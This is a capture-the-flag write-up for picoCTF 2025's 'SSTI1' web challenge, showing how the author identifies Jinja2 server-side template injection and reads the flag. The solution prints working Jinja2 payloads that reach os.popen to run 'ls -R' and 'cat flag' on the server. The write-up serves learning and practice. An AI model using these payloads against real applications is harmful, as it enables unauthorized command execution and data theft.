# SSTI1 - picoCTF 2025 Writeup

**Category:** Web Exploitation  
**Difficulty:** Easy

## Description
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps!

## Background
Upon opening the website, we are greeted with the home page with a user input field

![Homepage](images/Screenshot%202025-09-15%20233519.png)

Doing a quick search, the acronym SSTI stands for Server Side Template Injection, which is the vulnerability we'll use to exploit this website. SSTI is when an attacker can use template syntax to inject malicious payload into a template, which is then executed server-side. 

Our first step here is to identify which template engine is being used. To do this, I found a helpful diagram from [PortSwigger](https://portswigger.net/web-security/server-side-template-injection).

![PortSwigger Diagram](images/template-decision-tree.png)  

Inputting `{{7 * 7}}` in the textbox, we are able to narrow the engine down to Jinja2.

![](images/Screenshot%202025-09-15%20233811.png)
![](images/Screenshot%202025-09-15%20233826.png)

## Solution
Now that we've confirmed what template engine the web server is running, the next step is to run system commands. A common pattern in Jinja2 is to reach Python builtins via the request/application object. One such payload that lists files is

`{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read() }}`

![Listed files](images/Screenshot%202025-09-15%20232940.png "Listed Files")

We can see that there is a flag file listed.

`{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`

Using `cat` on this file, we obtain the flag. 


